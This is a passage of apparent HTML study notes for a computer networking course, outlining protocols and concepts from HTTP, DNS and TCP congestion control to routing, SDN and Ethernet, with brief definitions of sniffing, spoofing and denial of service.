rate</strong></li></ul></li><li><strong>Wireless radio</strong><ul><li>no physical “wire”</li><li><strong>broadcast</strong>, “half-duplex”</li><li><strong>propagation environment effects</strong></li></ul></li></ul><h3 id="Packet-switching"><a href="#Packet-switching" class="headerlink" title="Packet switching"></a>Packet switching</h3><ul><li><strong>On-demand allocation</strong><ul><li>Store-and-forward</li><li>Great for “bursty” data</li><li><strong>Resource sharing</strong></li></ul></li></ul><h3 id="Circuit-switching"><a href="#Circuit-switching" class="headerlink" title="Circuit switching"></a>Circuit switching</h3><ul><li><strong>Reserved resources</strong><ul><li>Dedicated, <strong>no resource sharing</strong></li><li>FDMA and TDMA</li></ul></li></ul><h3 id="Network-of-networks"><a href="#Network-of-networks" class="headerlink" title="Network of networks"></a>Network of networks</h3><ul><li><p><strong>Global Transit ISP</strong></p></li><li><p><strong>Content Provider Network</strong> (<strong>bypassing tier-1, regional ISPs</strong>)</p></li><li><p><strong>Internet Exchange Point</strong></p></li><li><p>Regional ISP</p></li><li><p>Access ISP</p>  <div align="center"><img src="/pic/137.png" width="100%" height="100%"></div></li></ul><h3 id="Performance"><a href="#Performance" class="headerlink" title="Performance"></a>Performance</h3><ul><li><p>Delay:</p><script type="math/tex; mode=display">  d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}</script></li><li><p><strong>Throughput</strong>: <strong>bottleneck link</strong> on end-end path that constrains throughput</p></li></ul><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><ul><li><strong>Packet Sniffing</strong>:<ul><li><strong>broadcast</strong> media (shared Ethernet, wireless)</li><li>promiscuous network interface reads/records all packets</li></ul></li><li><strong>IP spoofing</strong>:<ul><li>injection of packet with false source address</li></ul></li><li><strong>Denial of Service</strong>:<ul><li>overwhelme resource with bogus traffic</li><li>make resources (server, bandwidth) unavailable</li></ul></li></ul><h2 id="Application-layer"><a href="#Application-layer" class="headerlink" title="Application layer"></a>Application layer</h2><h3 id="Network-app"><a href="#Network-app" class="headerlink" title="Network app"></a>Network app</h3><ul><li>Run on <strong>end systems</strong></li><li>Not run on <strong>network-core devices</strong></li><li>(<strong>Network layer protocols</strong> in every Internet device: <strong>hosts, routers</strong>)</li></ul><h3 id="Client-server-paradigm"><a href="#Client-server-paradigm" class="headerlink" title="Client-server paradigm"></a>Client-server paradigm</h3><ul><li>Server:<ul><li>permanent IP address</li><li>often in data centers, for scaling</li></ul></li><li>Client:<ul><li><strong>intermittently</strong> connected</li><li><strong>dynamic IP addresses</strong></li><li>do <strong>not communicate directly</strong> with each other</li></ul></li><li>Examples: <strong>HTTP, IMAP, FTP</strong></li></ul><h3 id="Peer-peer-architecture"><a href="#Peer-peer-architecture" class="headerlink" title="Peer-peer architecture"></a>Peer-peer architecture</h3><ul><li>Peer:<ul><li><strong>intermittently</strong> connected</li><li><strong>dynamic IP addresses</strong></li><li>arbitrary end systems <strong>directly communicate</strong></li><li><strong>self scalability</strong> – new peers bring new service capacity and service demands</li></ul></li><li>Example: <strong>P2P file sharing</strong></li></ul><h3 id="TSL"><a href="#TSL" class="headerlink" title="TSL"></a>TSL</h3><ul><li><strong>Application-layer protocal</strong>, Provides <strong>encrypted TCP connections</strong></li></ul><h3 id="HTTP-Hypertext-Transfer-Protocol"><a href="#HTTP-Hypertext-Transfer-Protocol" class="headerlink" title="HTTP (Hypertext Transfer Protocol)"></a>HTTP (Hypertext Transfer Protocol)</h3><ul><li><p>Web’s <strong>Application-layer protocol</strong>, use <strong>TCP</strong></p>  <div align="center"><img src="/pic/138.png" width="100%" height="100%"></div></li><li><p><strong>Stateless</strong>: server maintains no information about past client requests</p></li><li><p>Developments:</p><ul><li>HTTP 1.1:<ul><li><strong>persistent</strong> HTTP</li><li>multiple, pipelined GETs over single TCP connection</li><li><strong>FCFS</strong> scheduling, <strong>HOL</strong> <strong>blocking</strong></li><li>loss recovery stalls object transmission</li></ul></li><li>HTTP/2:<ul><li>transmission order based on client-specified <strong>priority</strong>, interleaved</li><li>divide objects into frames, <strong>mitigate HOL blocking</strong></li><li>loss recovery stalls object transmission</li></ul></li><li>HTTP/3:<ul><li>adds <strong>security</strong>, per object error- &amp; congestion-control (more pipelining) <strong>over UDP</strong></li></ul></li></ul></li></ul><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><ul><li>Components:<ul><li>header line of <strong>HTTP response message</strong></li><li>header line in next <strong>HTTP request message</strong></li><li>file kept on <strong>user’s host</strong>, managed by user’s browser</li><li>back-end <strong>database at web site</strong></li></ul></li><li><div align="center"><img src="/pic/139.png" width="100%" height="100%"></div></li><li>Used for:<ul><li>authorization</li><li>recommendations</li><li>user session state</li></ul></li><li><strong>GDPR</strong> (EU General Data Protection Regulation)</li></ul><h3 id="Web-caches"><a href="#Web-caches" class="headerlink" title="Web caches"></a>Web caches</h3><ul><li>Acts as <strong>both client and server</strong></li><li><div align="center"><img src="/pic/140.png" width="100%" height="100%"></div></li><li>Browser caching: <strong>Conditional GET</strong></li><li>Pros:<ul><li>reduce <strong>end-end response time</strong></li><li>reduce <strong>traffic</strong> on institution’s <strong>access link</strong></li><li>enables content providers to <strong>effectively deliver content</strong></li></ul></li></ul><h3 id="SMTP-Simple-Mail-Transfer-Protocol"><a href="#SMTP-Simple-Mail-Transfer-Protocol" class="headerlink" title="SMTP (Simple Mail Transfer Protocol)"></a>SMTP (Simple Mail Transfer Protocol)</h3><ul><li>E-mail’s <strong>Application-layer protocol</strong>, use <strong>TCP</strong></li><li>Use <strong>persistent connections</strong></li><li>Comparison:<ul><li>HTTP<ul><li>client <strong>pull</strong></li><li>each object encapsulated in its own response message</li></ul></li><li>SMTP<ul><li>client <strong>push</strong></li><li>multiple objects sent in multipart message</li></ul></li></ul></li><li><strong>Mail access protocol</strong>: retrieval from server<ul><li><strong>IMAP</strong> (Internet Mail Access Protocol)</li><li><strong>POP</strong></li><li><strong>HTTP</strong></li></ul></li></ul><h3 id="DNS-Domain-Name-System"><a href="#DNS-Domain-Name-System" class="headerlink" title="DNS (Domain Name System)"></a>DNS (Domain Name System)</h3><ul><li><strong>Application-layer protocol</strong>, <strong>distributed</strong> and <strong>hierarchical</strong> database</li><li><p>Services:</p><ul><li>hostname to IP address translation</li><li>host aliasing<ul><li>canonical, alias names</li></ul></li><li>mail server aliasing</li><li><strong>load distribution</strong><ul><li><strong>replicated IP addresses</strong> correspond to <strong>one name</strong></li></ul></li></ul></li><li><p><strong>Decentralized</strong>:</p><ul><li><strong>single point of failure</strong></li><li><strong>traffic volume</strong></li><li><strong>distant</strong> centralized database</li><li><strong>maintenance</strong></li></ul></li><li><strong>DNSSEC</strong> – provides security</li><li><strong>ICANN</strong> - manages root DNS domain</li><li><strong>Local</strong> DNS server:<ul><li>local cache of recent translation pairs</li><li>doesn’t strictly belong to hierarchy</li><li><strong>forwarding request into DNS hierarchy</strong></li><li>TLD servers typically cached, <strong>allowing root server bypass</strong></li></ul></li><li><strong>Iterated</strong> query &amp; <strong>Recursive</strong> query</li><li>DNS <strong>records</strong>:<ul><li>type = A<ul><li>hostname - IP address</li></ul></li><li>type = CNAME<ul><li>alias name - canonical name</li></ul></li><li>type = NS<ul><li>domain - hostname of authoritative name server</li></ul></li><li>type = MX<ul><li>name - name of SMTP mail server</li></ul></li></ul></li><li><strong>Example</strong>:<ul><li><strong>register</strong> name at DNS registrar<ul><li>provide names, IP addresses of authoritative name server</li><li>inserts NS, A RRs into .com TLD server<ul><li>(networkutopia.com, dns1.networkutopia.com, NS)</li><li>(dns1.networkutopia.com, 212.212.212.1, A)</li></ul></li></ul></li><li><strong>create authoritative server locally</strong> with IP address 212.212.212.1<ul><li>type A record for www.networkuptopia.com</li><li>type MX record for networkutopia.com</li></ul></li></ul></li></ul><h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><ul><li><strong>File distribution time</strong>:<ul><li>client-server: $\max\{NF/u_s,F/d_{min}\}$</li><li>P2P: $\max\{F/u_s,F/d_{min},NF/(u_s+\sum u_i)\}$</li><li><div align="center"><img src="/pic/141.png" width="100%" height="100%"></div></li></ul></li><li>File distribution: <strong>BitTorrent</strong><ul><li>tracker</li><li>torrent</li><li>churn</li><li><strong>Sending chunks: tit-for-tat</strong><ul><li>sends chunks to four peers sending her chunks at highest rate </li><li>other peers <strong>choked</strong></li><li>every 30 secs select another peer, starts sending chunks</li><li>optimistically <strong>unchoke</strong> this peer</li></ul></li></ul></li></ul><h3 id="Video-Streaming-and-CDNs"><a href="#Video-Streaming-and-CDNs" class="headerlink" title="Video Streaming and CDNs"></a>Video Streaming and CDNs</h3><ul><li>Challenges:<ul><li><strong>server-to-client bandwidth varies</strong></li><li><strong>changing network congestion levels</strong></li><li><strong>packet loss, delay due to congestion</strong></li></ul></li><li><strong>DASH</strong> (Dynamic, Adaptive Streaming over HTTP)<ul><li><strong>Application-layer protocol</strong>, use <strong>HTTP</strong> and <strong>TCP</strong></li><li>Server:<ul><li>divides video file into <strong>chunks</strong>, encoded at different <strong>rates</strong></li><li>files <strong>replicated</strong> in various <strong>CDN nodes</strong></li><li>provides <strong>URLs</strong> for different chunks (<strong>manifest file</strong>)</li></ul></li><li>Client:<ul><li>periodically <strong>estimates server-to-client bandwidth</strong></li><li><strong>consulting manifest</strong>, requests one chunk at a time </li><li>choose rates at <strong>different time</strong> and from <strong>different servers</strong></li><li><strong>“Intelligence” at client</strong></li></ul></li></ul></li><li><strong>single, large “mega-server”:</strong><ul><li><strong>single point of failure</strong></li><li>point of network <strong>congestion</strong></li><li><strong>long path</strong> to distant clients</li></ul></li><li><strong>CDN</strong>:<ul><li>multiple copies of videos at <strong>geographically distributed sites</strong><ul><li><strong>enter deep</strong>: push servers deep into many access networks</li><li><strong>bring home</strong>: smaller number of larger clusters in POPs near access nets</li></ul></li></ul></li></ul><h2 id="Transport-Layer"><a href="#Transport-Layer" class="headerlink" title="Transport Layer"></a>Transport Layer</h2><h3 id="Services-not-available"><a href="#Services-not-available" class="headerlink" title="Services not available"></a>Services not available</h3><ul><li><strong>Delay</strong> guarantees</li><li><strong>Bandwidth</strong> guarantees</li></ul><h3 id="Demultiplexing"><a href="#Demultiplexing" class="headerlink" title="Demultiplexing"></a>Demultiplexing</h3><ul><li><strong>Connectionless</strong>:<ul><li>UDP: using destination <strong>port number</strong> (only)</li></ul></li><li><strong>Connection-oriented</strong>:<ul><li>TCP: using <strong>4-tuple</strong>, <strong>IP addresses and port numbers</strong></li><li>support <strong>simultaneous TCP sockets</strong></li></ul></li></ul><h3 id="UDP-User-Datagram-Protocol"><a href="#UDP-User-Datagram-Protocol" class="headerlink" title="UDP (User Datagram Protocol)"></a>UDP (User Datagram Protocol)</h3><div align="center"><img src="/pic/142.png" width="100%" height="100%"></div><ul><li>Pros:<ul><li><strong>No connection establishment</strong> (which <strong>adds RTT delay</strong>)</li><li><strong>No connection state</strong> at sender, receiver</li><li><strong>Small header size</strong></li><li><strong>No congestion control</strong>, blast away as fast as desired</li><li>Helps with <strong>reliability</strong> (checksum)</li></ul></li><li><strong>Used by</strong>:<ul><li>streaming multimedia apps</li><li><strong>DNS</strong></li><li><strong>DHCP</strong></li><li><strong>SNMP</strong></li><li><strong>HTTP/3</strong></li></ul></li></ul><h3 id="RDT-Reliable-Data-Transfer-Protocol"><a href="#RDT-Reliable-Data-Transfer-Protocol" class="headerlink" title="RDT (Reliable Data Transfer Protocol)"></a>RDT (Reliable Data Transfer Protocol)</h3><ul><li><p><strong>Stop and Wait</strong>:</p>  <div align="center"><img src="/pic/143.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/144.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/145.png" width="100%" height="100%"></div></li><li><p><strong>Go-Back-N</strong>:</p>  <div align="center"><img src="/pic/146.png" width="100%" height="100%"></div></li><li><p><strong>Selective repeat</strong>:</p>  <div align="center"><img src="/pic/147.png" width="100%" height="100%"></div></li></ul><h3 id="TCP-Transfer-Control-Protocol"><a href="#TCP-Transfer-Control-Protocol" class="headerlink" title="TCP (Transfer Control Protocol)"></a>TCP (Transfer Control Protocol)</h3><div align="center"><img src="/pic/148.png" width="100%" height="100%"></div><ul><li><p>Retransmission:</p>  <div align="center"><img src="/pic/149.png" width="100%" height="100%"></div>  <div align="center"><img src="/pic/150.png" width="100%" height="100%"></div></li><li><p><strong>Flow control</strong>:</p><ul><li>network layer <strong>delivers</strong> data <strong>faster</strong> than application layer <strong>removes</strong> data from socket buffers</li><li><strong>receiver “advertises” free buffer space</strong> in <strong>rwnd</strong> in TCP header</li><li><strong>sender limits amount of unACKed data</strong> to received <strong>rwnd</strong></li></ul></li><li><p><strong>Connection management</strong>:</p><ul><li><p>2-way handshake:</p><ul><li><strong>half open connection</strong> (no client)</li><li><strong>dup data accepted</strong></li></ul></li><li><p>3-way handshake:</p>  <div align="center"><img src="/pic/151.png" width="100%" height="100%"></div></li></ul></li></ul><h3 id="Congestion-control"><a href="#Congestion-control" class="headerlink" title="Congestion control"></a>Congestion control</h3><ul><li><p><strong>Costs</strong> of congestion: </p><ul><li><strong>needed retransmissions</strong>: more work for given receiver throughput</li><li><strong>unneeded retransmissions</strong>: link carries multiple copies of a packet</li><li><p><strong>packet dropped</strong>: upstream capacity and buffering wasted</p><div align="center"><img src="/pic/152.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>End-end</strong> congestion control:</p><ul><li><strong>no explicit feedback</strong> from network</li><li>congestion <strong>inferred</strong> from <strong>observed loss, delay</strong></li><li>taken by: <strong>TCP</strong></li></ul></li><li><p><strong>Network-assisted</strong> congestion control:</p><ul><li><strong>router</strong>s provide <strong>direct feedback</strong> to hosts</li><li>taken by: <strong>TCP ECN, ATM, DECbit</strong></li></ul></li></ul><h3 id="AIMD-Additive-Increase-Multiplicative-Decrease"><a href="#AIMD-Additive-Increase-Multiplicative-Decrease" class="headerlink" title="AIMD (Additive Increase Multiplicative Decrease)"></a>AIMD (Additive Increase Multiplicative Decrease)</h3><ul><li><p><strong>Multiplicative decrease</strong>:</p><ul><li><strong>Cut in half</strong> on loss detected by triple duplicate ACK (<strong>TCP Reno</strong>)</li><li><strong>Cut to 1 MSS</strong> when loss detected by timeout (<strong>TCP Tahoe</strong>)</li></ul></li><li><p>(1) TCP <strong>slow start</strong>:</p>  <div align="center"><img src="/pic/153.png" width="100%" height="100%"></div></li><li><p>(2) TCP <strong>congestion avoidance</strong>:</p>  <div align="center"><img src="/pic/154.png" width="100%" height="100%"></div></li><li><p><strong>AIMD Summary</strong>:</p>  <div align="center"><img src="/pic/155.png" width="100%" height="100%"></div></li></ul><h3 id="Other-congestion-control-methods"><a href="#Other-congestion-control-methods" class="headerlink" title="Other congestion control methods"></a>Other congestion control methods</h3><ul><li><p><strong>TCP CUBIC</strong></p><ul><li><p>Increase W as <strong>function of cube distance</strong> between time and K</p>  <div align="center"><img src="/pic/156.png" width="100%" height="100%"></div></li></ul></li><li><p><strong>Delay-based TCP congestion control</strong></p><ul><li>Minimum observed RTT (uncongested path)</li><li>Measured throughput <strong>close to</strong> uncongested throughput:<ul><li><strong>increase cwnd linearly</strong></li></ul></li><li>Measured throughput <strong>far below</strong> uncongested throughout:<ul><li><strong>decrease cwnd linearly</strong></li></ul></li><li><strong>Without inducing/forcing loss</strong></li></ul></li><li><p><strong>ECN</strong> (Explicit congestion notification)</p><ul><li><strong>congestion indication</strong> carried to <strong>destination</strong></li><li><strong>destination</strong> sets <strong>ECE bit</strong> on <strong>ACK segment</strong> to <strong>notify sender</strong></li><li>involves <strong>IP</strong> (header <strong>ECN bit</strong>) and <strong>TCP</strong> (header <strong>C, E bit</strong>)</li></ul></li></ul><h3 id="QUIC-Quick-UDP-Internet-Connections"><a href="#QUIC-Quick-UDP-Internet-Connections" class="headerlink" title="QUIC (Quick UDP Internet Connections)"></a>QUIC (Quick UDP Internet Connections)</h3><ul><li><strong>Application-layer protocol</strong>, use <strong>UDP</strong><ul><li>increase performance of HTTP</li><li>deployed on many Google servers, apps</li><li>parallelism streams, <strong>no HOL blocking</strong></li></ul></li></ul><h2 id="Network-Layer-Data-Plane"><a href="#Network-Layer-Data-Plane" class="headerlink" title="Network Layer: Data Plane"></a>Network Layer: Data Plane</h2><h3 id="Input-port-functions"><a href="#Input-port-functions" class="headerlink" title="Input port functions"></a>Input port functions</h3><div align="center"><img src="/pic/157.png" width="100%" height="100%"></div><ul><li><strong>Decentralized switching</strong>: <ul><li>Using <strong>header field values</strong>, <strong>lookup output port</strong> using <strong>forwarding table</strong> in memory (“<strong>match plus action</strong>”)</li><li><strong>destination-based forwarding</strong>: based on destination <strong>IP address</strong></li><li><strong>generalized forwarding</strong>: based on any set of <strong>header field values</strong></li></ul></li></ul><h3 id="Switching-fabrics"><a href="#Switching-fabrics" class="headerlink" title="Switching fabrics:"></a><strong>Switching fabrics</strong>:</h3><ul><li>Switching via <strong>memory</strong>:<ul><li>speed limited by memory bandwidth (2 bus crossings per gram)</li></ul></li><li>Switching via <strong>bus</strong>:<ul><li>switching speed limited by bus bandwidth</li></ul></li><li><strong>Switching via interconnection network</strong>:<ul><li>n$\times$n switch from multiple stages of smaller switches</li></ul></li></ul><h3 id="Output-port-functions"><a href="#Output-port-functions" class="headerlink" title="Output port functions"></a>Output port functions</h3><div align="center"><img src="/pic/158.png" width="100%" height="100%"></div><ul><li><strong>Queueing</strong> and <strong>loss</strong> due to output port <strong>buffer overflow</strong></li><li>Buffer management: <strong>drop</strong> and <strong>marking</strong></li><li><strong>Packet scheduling</strong>: which packet to send next on link<ul><li><strong>FCFS</strong></li><li><strong>Priority</strong>: FCFS within priority class</li><li><strong>Round Robin</strong> (RR): cyclically, repeatedly scans class queues</li><li><strong>Weighted Fair Queueing</strong> (WFQ): minimum bandwidth guarantee</li></ul></li></ul><h3 id="IP-addressing"><a href="#IP-addressing" class="headerlink" title="IP addressing"></a>IP addressing</h3><div align="center"><img src="/pic/159.png" width="100%" height="100%"></div><ul><li><strong>Subnets</strong>: device interfaces reaching each other <strong>without passing a router</strong></li><li><strong>CIDR</strong> (Classless InterDomain Routing)</li><li><strong>DHCP</strong> (Dynamic Host Configuration Protocol)<ul><li><strong>Application-layer protocal</strong>, use <strong>UDP</strong></li><li>Pros:<ul><li>can <strong>renew</strong> its lease on address in use</li><li><strong>allows reuse</strong> of addresses (hold address while connected/on)</li><li><strong>support for mobile</strong> users who join/leave network </li></ul></li></ul></li><li><strong>Hierarchical addressing</strong>:<ul><li><strong>route aggregation</strong></li><li>allows efficient advertisement of routing information</li></ul></li><li><strong>ICANN</strong>: allocates IP addresses</li></ul><h3 id="NAT-Network-Address-Translation"><a href="#NAT-Network-Address-Translation" class="headerlink" title="NAT (Network Address Translation)"></a>NAT (Network Address Translation)</h3><ul><li>Devices in <strong>local network</strong> share <strong>one IPv4 address</strong> as outside is concerned</li><li>Pros:<ul><li>just <strong>one IP address</strong> needed from provider ISP for <strong>all devices</strong></li><li><strong>change address</strong> of host in local network <strong>without notifying outside</strong> </li><li><strong>change ISP</strong> without changing addresses of devices in local network</li><li>security: devices inside local net <strong>not directly addressable</strong> by outside</li></ul></li><li>Remember in <strong>NAT translation table</strong></li><li>Violates <strong>end-to-end argument</strong> (<strong>port manipulation</strong> by <strong>network-layer</strong>)</li></ul><h3 id="Tunneling"><a href="#Tunneling" class="headerlink" title="Tunneling"></a>Tunneling</h3><div align="center"><img src="/pic/160.png" width="100%" height="100%"></div><ul><li><p><strong>IPv6 datagram</strong> as <strong>payload</strong> in IPv4 datagram <strong>among IPv4 routers</strong></p>  <div align="center"><img src="/pic/161.png" width="100%" height="100%"></div></li></ul><h3 id="Generalized-forwarding"><a href="#Generalized-forwarding" class="headerlink" title="Generalized forwarding"></a>Generalized forwarding</h3><ul><li><strong>“match plus action”</strong> abstraction: match <strong>bits in packet header</strong> in <strong>any layers</strong>, take action<ul><li>matching over many fields (<strong>link-, network-, transport-layer</strong>)</li><li>drop, forward, modify, or send matched packet to controller</li><li>“program” network-wide behaviors</li></ul></li></ul><h3 id="Architectural-Principles-of-the-Internet"><a href="#Architectural-Principles-of-the-Internet" class="headerlink" title="Architectural Principles of the Internet"></a>Architectural Principles of the Internet</h3><ul><li>Three cornerstone beliefs:<ul><li><strong>simple connectivity</strong></li><li><strong>IP protocol: that narrow waist</strong></li><li><strong>intelligence, complexity at network edge</strong></li></ul></li></ul><h2 id="Network-Layer-Control-Plane"><a href="#Network-Layer-Control-Plane" class="headerlink" title="Network Layer: Control Plane"></a>Network Layer: Control Plane</h2><h3 id="Routing-protocols"><a href="#Routing-protocols" class="headerlink" title="Routing protocols"></a>Routing protocols</h3><ul><li><strong>Link state</strong>:<ul><li><strong>centralized</strong></li><li><strong>iterative</strong></li><li>link costs depend on <strong>traffic volume</strong>, route oscillations possible</li></ul></li><li><strong>Distance vector</strong>:<ul><li><strong>distributed</strong></li><li><strong>iterative</strong></li><li><strong>asynchronous</strong></li><li><strong>self-stopping</strong></li><li>good news travels fast, bad news travels slow (<strong>count-to-infinity</strong>)</li></ul></li></ul><h3 id="Intra-ISP-routing"><a href="#Intra-ISP-routing" class="headerlink" title="Intra-ISP routing"></a>Intra-ISP routing</h3><ul><li><p>Focus on <strong>performance</strong></p></li><li><p><strong>Aggregate routers into regions</strong> as <strong>autonomous systems (AS)</strong></p><ul><li>Routers in same AS run <strong>same intra-AS protocol</strong></li><li>Routers in different AS run <strong>different intra-AS protocols</strong></li><li><strong>Gateways</strong> perform <strong>inter-AS as well as intra-AS routing</strong></li></ul></li><li><p><strong>Forwarding table</strong> configured by <strong>intra- &amp; inter-AS routing algorithms</strong></p></li><li><p><strong>RIP</strong> (Routing Information Protocol)</p><ul><li><strong>Application-layer protocal</strong>, use <strong>UDP</strong></li><li>classic <strong>DV</strong></li><li>no longer widely used</li></ul></li><li><p><strong>EIGRP</strong> (Enhanced Interior Gateway Routing Protocol)</p><ul><li><strong>Network-layer protocal</strong></li><li><strong>DV</strong> based</li></ul></li><li><p><strong>OSPF</strong> (Open Shortest Path First)</p><ul><li><p><strong>Network-layer protocal</strong>, use <strong>IP</strong></p></li><li><p><strong>LS</strong> routing</p></li><li><p><strong>IS-IS</strong> protocol (ISO standard) essentially same as <strong>OSPF</strong></p></li><li><p><strong>Hierarchical</strong>:</p><ul><li><strong>two-level</strong> hierarchy: local area, backbone.</li><li><p>each node has detailed <strong>area topology</strong> (only direction to others)</p><div align="center"><img src="/pic/162.png" width="100%" height="100%"></div></li></ul></li></ul></li></ul><h3 id="Inter-ISP-routing"><a href="#Inter-ISP-routing" class="headerlink" title="Inter-ISP routing"></a>Inter-ISP routing</h3><ul><li><strong>Policy</strong> dominates over <strong>performance</strong></li><li><strong>BGP</strong> (Border Gateway Protocol)<ul><li><strong>Application-layer protocal</strong>, use <strong>TCP</strong></li><li><strong>path vector</strong> protocol</li><li><strong>policy-based</strong> routing: AS1 gateway router 1c chooses path AS3,X</li><li><div align="center"><img src="/pic/163.png" width="100%" height="100%"></div></li><li>Route selection:<ul><li><strong>local preference</strong> value attribute: <strong>policy</strong> decision</li><li><strong>shortest AS-PATH</strong></li><li><strong>closest NEXT-HOP router</strong> <strong>(hot potato routing)</strong></li></ul></li></ul></li></ul><h3 id="SDN-Software-defined-networking"><a href="#SDN-Software-defined-networking" class="headerlink" title="SDN (Software defined networking)"></a>SDN (Software defined networking)</h3><ul><li><p><strong>Logically centralized</strong> control plane:</p><ul><li><strong>easier</strong> network <strong>management</strong>: avoid misconfigurations, greater flexibility of flows</li><li><strong>table-based</strong> forwarding allows <strong>easier</strong> centralized “<strong>programming</strong>”</li><li><strong>open implementation</strong> of control plane</li></ul></li><li><p>Components:</p><ul><li>Data-plane <strong>switches</strong></li><li>SDN <strong>controller</strong>: distributed for performance, scalability, robustness</li><li>Network-control <strong>apps</strong>: unbundled</li></ul></li><li><p><strong>SDN controller</strong>:</p><ul><li><strong>interface layer</strong> to network control apps: abstractions API</li><li>network-wide <strong>state management</strong>: a distributed database</li><li><strong>communication</strong>: communicate between controller and switches</li></ul></li><li><p><strong>OpenFlow protocol</strong>:</p><ul><li>operates between <strong>controller and switch</strong></li><li><strong>Application-layer protocal</strong>, use <strong>TCP</strong> to exchange messages</li><li>distinct from <strong>OpenFlow API</strong> (specify generalized forwarding actions)</li></ul></li><li><p>Example:</p>  <div align="center"><img src="/pic/164.png" width="100%" height="100%"></div></li><li><p><strong>ODL controller</strong>:</p><ul><li><strong>Service Abstraction Layer</strong>: interconnects internal, external applications and services</li></ul></li></ul><h3 id="ICMP-Internet-Control-Message-Protocol"><a href="#ICMP-Internet-Control-Message-Protocol" class="headerlink" title="ICMP (Internet Control Message Protocol)"></a>ICMP (Internet Control Message Protocol)</h3><ul><li>Communicate <strong>network-level</strong> information</li><li><strong>Network-layer protocal</strong>, carried in <strong>IP datagrams</strong>.</li></ul><h3 id="Network-management"><a href="#Network-management" class="headerlink" title="Network management"></a>Network management</h3><ul><li><p>Components:</p><ul><li>Managing server</li><li>Managed device</li><li>Network management protocol</li></ul></li><li><p><strong>SNMP</strong> (Simple Network Management Protocol):</p>  <div align="center"><img src="/pic/165.png" width="100%" height="100%"></div><ul><li><strong>Application-layer protocol</strong>, use <strong>UDP</strong></li><li><strong>SMI</strong> (Structure of Management Information): data definition language</li></ul></li></ul><h2 id="Link-Layer-and-LANs"><a href="#Link-Layer-and-LANs" class="headerlink" title="Link Layer and LANs"></a>Link Layer and LANs</h2><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><ul><li>implemented in <strong>network interface card (NIC)</strong> or on a chip</li><li>combination of <strong>hardware, software, firmware</strong><ul><li>framing</li><li><strong>link access</strong></li><li><strong>reliable delivery</strong><ul><li>seldom used on <strong>low bit-error links</strong></li></ul></li><li>flow control</li><li><strong>error detection &amp; correction</strong><ul><li><strong>CRC</strong>: used in <strong>Ethernet</strong>, <strong>802.11 WiFi</strong></li></ul></li></ul></li></ul><h3 id="Multiple-Access-Protocols"><a href="#Multiple-Access-Protocols" class="headerlink" title="Multiple Access Protocols"></a>Multiple Access Protocols</h3><ul><li><p>Channel Partitioning</p><ul><li><strong>TDMA, FDMA</strong></li></ul></li><li><p>Random Access: detect and recover from collisions</p><ul><li><p><strong>ALOHA, slotted ALOHA</strong></p></li><li><p><strong>CSMA, CSMA/CD, CSMA/CA</strong></p>  <div align="center"><img src="/pic/166.png" width="100%" height="100%"></div></li></ul></li><li><p>Taking Turns</p><ul><li><strong>Polling, Token Passing</strong></li></ul></li></ul><h3 id="ARP-Address-Resolution-Protocol"><a href="#ARP-Address-Resolution-Protocol" class="headerlink" title="ARP (Address Resolution Protocol)"></a>ARP (Address Resolution Protocol)</h3><ul><li><strong>Network-layer - Link-layer protocal</strong></li><li>MAC <strong>flat address</strong>:<ul><li><strong>portability</strong> </li><li>move interface from one LAN to another</li></ul></li><li>Routing <strong>within a subnet</strong> or <strong>to another subnet</strong></li></ul><h3 id="Ethernet"><a href="#Ethernet" class="headerlink" title="Ethernet"></a>Ethernet</h3><ul><li><p>Physical topology:</p><ul><li>bus</li><li>switched</li></ul></li><li><p><strong>Ethernet frame</strong></p>  <div align="center"><img src="/pic/167.png" width="100%" height="100%"></div><ul><li>receive frame with matching destination address or with broadcast address (ARP packet), pass data in frame to network layer protocol</li><li>otherwise discard frame</li></ul></li><li><p><strong>Unreliable</strong>, <strong>connectionless</strong>, unslotted <strong>CSMA/CD with binary backoff</strong></p></li></ul><h3 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h3><ul><li>Store and <strong>selectively forward</strong> </li><li><strong>Transparent</strong>, <strong>no collisions</strong></li><li><strong>Plug-and-play</strong>, <strong>self-learning</strong></li></ul><h3 id="VLANs"><a href="#VLANs" class="headerlink" title="VLANs"></a>VLANs</h3><ul><li>Reasons:<ul><li>scaling: all <strong>layer-2 broadcast traffic</strong> must <strong>cross entire LAN</strong> </li><li>efficiency, security, privacy, efficiency issues</li></ul></li><li><strong>Port-based VLAN</strong>:<ul><li><strong>multiple virtual LANS</strong> over <strong>single physical LAN infrastructure</strong></li><li><strong>traffic isolation</strong></li><li><strong>dynamic membership</strong></li><li><strong>forwarding between VLANS via routing</strong></li><li><strong>trunk</strong> port:<ul><li>carry frames between <strong>VLANS over multiple physical switches</strong></li><li>frames must carry <strong>VLAN ID info</strong></li><li><strong>802.1Q protocol</strong> adds/removed additional header fields</li></ul></li></ul></li></ul><h3 id="MPLS-Multiprotocol-label-switching"><a href="#MPLS-Multiprotocol-label-switching" class="headerlink" title="MPLS (Multiprotocol label switching)"></a>MPLS (Multiprotocol label switching)</h3><ul><li>Between <strong>Ethernet</strong> and <strong>IP</strong></li><li><strong>high-speed IP forwarding</strong> among network of <strong>label-switched router</strong></li><li>MPLS <strong>forwarding table</strong> distinct from IP forwarding tables</li><li><strong>Flexibility</strong><ul><li><strong>traffic engineering</strong>: use <strong>destination and source addresses</strong> to route flows to same destination differently</li><li><strong>fast reroute</strong>: <strong>pre-computed backup paths</strong> in case of link failure</li></ul></li></ul><h3 id="Datacenter-networks"><a href="#Datacenter-networks" class="headerlink" title="Datacenter networks"></a>Datacenter networks</h3><ul><li>Network elements:<ul><li>Border routers</li><li>Tier-1 switches</li><li>Tier-2 switches</li><li>Top of Rack (TOR) switch</li><li>Server racks</li></ul></li><li><strong>Load balancer</strong><ul><li><strong>application-layer routing</strong></li><li>hiding data center internals from client</li></ul></li></ul><h2 id="Wireless-and-Mobile-Networks"><a href="#Wireless-and-Mobile-Networks" class="headerlink" title="Wireless and Mobile Networks"></a>Wireless and Mobile Networks</h2><h3 id="Wireless-network-taxonomy"><a href="#Wireless-network-taxonomy" class="headerlink" title="Wireless network taxonomy"></a>Wireless network 